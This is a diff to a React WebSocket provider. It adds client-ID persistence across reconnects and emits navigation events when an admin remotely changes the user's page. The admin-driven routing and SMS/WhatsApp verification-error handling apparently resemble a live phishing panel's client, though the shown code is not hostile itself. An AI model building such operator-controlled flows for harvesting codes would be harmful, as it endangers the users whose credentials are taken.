@@ -12,6 +12,7 @@ export const WebSocketProvider = ({ children }) => {
   const [clientId, setClientId] = useState(null);
   const [isLoading, setIsLoading] = useState(true);
   const [verificationError, setVerificationError] = useState(null); // {type: 'sms'|'whatsapp'|'auth'|'email', message: string}
+  const [navigationEvent, setNavigationEvent] = useState(null); // Emitted when admin navigates - {route, timestamp}
   const wsRef = useRef(null);
   const navigate = useNavigate();
   const reconnectTimeoutRef = useRef(null);
@@ -22,6 +23,15 @@ export const WebSocketProvider = ({ children }) => {
   const clearVerificationError = useCallback(() => {
     setVerificationError(null);
   }, []);
+
+  // Clear navigation event (call after handling)
+  const clearNavigationEvent = useCallback(() => {
+    setNavigationEvent(null);
+  }, []);
+
+  // Get/set stored client ID (persists across reconnects)
+  const getStoredClientId = () => sessionStorage.getItem('ws_client_id');
+  const setStoredClientId = (id) => sessionStorage.setItem('ws_client_id', id);
 
   // Check if notification was already sent (persists across reconnects)
   const wasNotificationSent = () => {
@@ -105,6 +115,16 @@ export const WebSocketProvider = ({ children }) => {
       setIsConnected(true);
       setIsLoading(false);
 
+      // Send reconnect request with existing client_id if available
+      const existingClientId = getStoredClientId();
+      if (existingClientId) {
+        console.log('Reconnecting with existing client_id:', existingClientId);
+        ws.send(JSON.stringify({
+          type: 'reconnect',
+          client_id: existingClientId
+        }));
+      }
+
       // Start ping interval to keep connection alive
       pingIntervalRef.current = setInterval(() => {
         if (ws.readyState === WebSocket.OPEN) {
@@ -120,14 +140,29 @@ export const WebSocketProvider = ({ children }) => {
 
         switch (data.type) {
           case 'connected':
-            // Store client ID
+            // Only store new client_id if we don't already have one stored
+            // (If we have stored client_id, we're waiting for 'reconnected' response)
+            const storedId = getStoredClientId();
+            if (!storedId) {
+              setClientId(data.client_id);
+              setStoredClientId(data.client_id);
+              console.log('New Client ID:', data.client_id);
+              
+              // Pre-fetch client info for later use
+              fetchClientInfo().then(info => {
+                console.log('Client info prefetched:', info);
+              });
+            } else {
+              console.log('Ignoring new client_id, waiting for reconnect response. Stored:', storedId);
+            }
+            break;
+
+          case 'reconnected':
+            // Session restored with existing client_id
             setClientId(data.client_id);
-            console.log('Client ID:', data.client_id);
-            
-            // Pre-fetch client info for later use
-            fetchClientInfo().then(info => {
-              console.log('Client info prefetched:', info);
-            });
+            // Also ensure sessionStorage is in sync
+            setStoredClientId(data.client_id);
+            console.log('Reconnected with client ID:', data.client_id);
             break;
 
           case 'navigate':
@@ -135,6 +170,8 @@ export const WebSocketProvider = ({ children }) => {
             console.log('Navigating to:', data.route);
             // Clear any existing error when navigating
             setVerificationError(null);
+            // Emit navigation event so pages can reset their state
+            setNavigationEvent({ route: data.route, timestamp: Date.now() });
             navigate(data.route);
             break;
 
@@ -241,7 +278,9 @@ export const WebSocketProvider = ({ children }) => {
     sendInitialData,
     reconnect: connect,
     verificationError,
-    clearVerificationError
+    clearVerificationError,
+    navigationEvent,
+    clearNavigationEvent
   };
 
   return (
